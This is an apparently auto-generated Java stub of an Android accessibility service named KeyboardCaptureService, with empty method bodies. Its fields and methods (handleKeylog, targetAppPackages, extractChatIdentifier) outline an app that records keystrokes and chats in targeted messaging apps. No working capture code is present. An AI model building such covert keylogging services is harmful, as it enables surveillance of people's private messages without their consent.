package com.chats.capture.services;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000F\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\"\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0010\u000b\n\u0002\b\u0007\u0018\u0000 \u001e2\u00020\u0001:\u0001\u001eB\u0005\u00a2\u0006\u0002\u0010\u0002J\u0012\u0010\u000f\u001a\u0004\u0018\u00010\b2\u0006\u0010\u0010\u001a\u00020\u0011H\u0002J\u0010\u0010\u0012\u001a\u00020\b2\u0006\u0010\u0013\u001a\u00020\bH\u0002J\u0010\u0010\u0014\u001a\u00020\u00152\u0006\u0010\u0010\u001a\u00020\u0011H\u0002J\u0010\u0010\u0016\u001a\u00020\u00152\u0006\u0010\u0010\u001a\u00020\u0011H\u0002J\u0010\u0010\u0017\u001a\u00020\u00182\u0006\u0010\u0013\u001a\u00020\bH\u0002J\u0010\u0010\u0019\u001a\u00020\u00152\u0006\u0010\u0010\u001a\u00020\u0011H\u0016J\b\u0010\u001a\u001a\u00020\u0015H\u0016J\b\u0010\u001b\u001a\u00020\u0015H\u0016J\b\u0010\u001c\u001a\u00020\u0015H\u0014J\b\u0010\u001d\u001a\u00020\u0015H\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082.\u00a2\u0006\u0002\n\u0000R\u0010\u0010\u0007\u001a\u0004\u0018\u00010\bX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\bX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\n\u001a\u00020\bX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000b\u001a\u00020\fX\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u0014\u0010\r\u001a\b\u0012\u0004\u0012\u00020\b0\u000eX\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u001f"}, d2 = {"Lcom/chats/capture/services/KeyboardCaptureService;", "Landroid/accessibilityservice/AccessibilityService;", "()V", "chatDao", "Lcom/chats/capture/database/ChatDao;", "deviceRegistrationManager", "Lcom/chats/capture/managers/DeviceRegistrationManager;", "lastChatIdentifier", "", "lastPackageName", "lastTextBuffer", "serviceScope", "Lkotlinx/coroutines/CoroutineScope;", "targetAppPackages", "", "extractChatIdentifier", "event", "Landroid/view/accessibility/AccessibilityEvent;", "getAppName", "packageName", "handleKeylog", "", "handleTextChanged", "isTargetApp", "", "onAccessibilityEvent", "onDestroy", "onInterrupt", "onServiceConnected", "startForegroundService", "Companion", "app_debug"})
public final class KeyboardCaptureService extends android.accessibilityservice.AccessibilityService {
    @org.jetbrains.annotations.NotNull()
    private final kotlinx.coroutines.CoroutineScope serviceScope = null;
    private com.chats.capture.database.ChatDao chatDao;
    private com.chats.capture.managers.DeviceRegistrationManager deviceRegistrationManager;
    @org.jetbrains.annotations.NotNull()
    private final java.util.Set<java.lang.String> targetAppPackages = null;
    @org.jetbrains.annotations.NotNull()
    private java.lang.String lastTextBuffer = "";
    @org.jetbrains.annotations.NotNull()
    private java.lang.String lastPackageName = "";
    @org.jetbrains.annotations.Nullable()
    private java.lang.String lastChatIdentifier;
    private static final int KEYBOARD_SERVICE_ID = 1002;
    @org.jetbrains.annotations.NotNull()
    public static final com.chats.capture.services.KeyboardCaptureService.Companion Companion = null;
    
    public KeyboardCaptureService() {
        super();
    }
    
    @java.lang.Override()
    protected void onServiceConnected() {
    }
    
    @java.lang.Override()
    public void onDestroy() {
    }
    
    @java.lang.Override()
    public void onAccessibilityEvent(@org.jetbrains.annotations.NotNull()
    android.view.accessibility.AccessibilityEvent event) {
    }
    
    private final void handleKeylog(android.view.accessibility.AccessibilityEvent event) {
    }
    
    @java.lang.Override()
    public void onInterrupt() {
    }
    
    private final void handleTextChanged(android.view.accessibility.AccessibilityEvent event) {
    }
    
    private final java.lang.String extractChatIdentifier(android.view.accessibility.AccessibilityEvent event) {
        return null;
    }
    
    private final boolean isTargetApp(java.lang.String packageName) {
        return false;
    }
    
    private final java.lang.String getAppName(java.lang.String packageName) {
        return null;
    }
    
    private final void startForegroundService() {
    }
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000\u0012\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\b\n\u0000\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002\u00a2\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u0005"}, d2 = {"Lcom/chats/capture/services/KeyboardCaptureService$Companion;", "", "()V", "KEYBOARD_SERVICE_ID", "", "app_debug"})
    public static final class Companion {
        
        private Companion() {
            super();
        }
    }
}